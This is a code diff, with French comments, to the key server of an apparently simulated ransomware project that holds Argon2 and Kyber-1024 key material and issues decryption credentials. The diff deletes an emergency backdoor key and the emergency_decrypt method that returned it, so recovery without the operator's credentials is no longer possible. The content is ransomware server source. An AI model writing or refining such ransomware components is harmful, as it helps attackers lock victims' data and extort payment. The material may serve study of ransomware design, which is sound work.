@@ -22,7 +22,6 @@ class RansomwareServer:
         self.password: Optional[str] = None
         self.salt: Optional[bytes] = None
         self.argon2_params: Optional[Dict] = None
-        self.backdoor_key: Optional[bytes] = None
         self.kyber_public_key: Optional[bytes] = None
         self.kyber_secret_key: Optional[bytes] = None
         self.initialized = False
@@ -37,7 +36,6 @@ class RansomwareServer:
             - salt: Salt pour Argon2
             - argon2_params: Paramètres Argon2
             - kyber_public_key: Clé publique Kyber-1024
-            - backdoor_key: Clé de secours (mode urgence)
         """
         print("[SERVEUR] Initialisation du serveur...")
 
@@ -60,10 +58,6 @@ class RansomwareServer:
             "hash_len": config.ARGON2_HASH_LEN,
         }
 
-        # Génère la clé de secours (backdoor)
-        print("[SERVEUR] Génération de la clé de secours (mode urgence)...")
-        self.backdoor_key = crypto_utils.generate_random_key()
-
         self.initialized = True
         print("[SERVEUR] Initialisation terminée.")
 
@@ -73,7 +67,6 @@ class RansomwareServer:
             "salt": self.salt,
             "argon2_params": self.argon2_params,
             "kyber_public_key": self.kyber_public_key,
-            "backdoor_key": self.backdoor_key,
         }
 
     def request_full_decryption_credentials(self) -> Dict:
@@ -178,23 +171,6 @@ class RansomwareServer:
             "salt": new_salt,
             "argon2_params": new_argon2_params,
         }
-
-    def emergency_decrypt(self) -> bytes:
-        """
-        Retourne la clé de secours pour le déchiffrement d'urgence
-
-        Returns:
-            Clé de secours
-        """
-        if not self.initialized:
-            raise RuntimeError("Le serveur n'est pas initialisé")
-
-        if self.backdoor_key is None:
-            raise RuntimeError("La clé de secours n'est pas disponible")
-
-        print("[SERVEUR] [URGENCE] Envoi de la clé de secours...")
-
-        return self.backdoor_key
 
 
 # Instance globale du serveur (simulation locale)
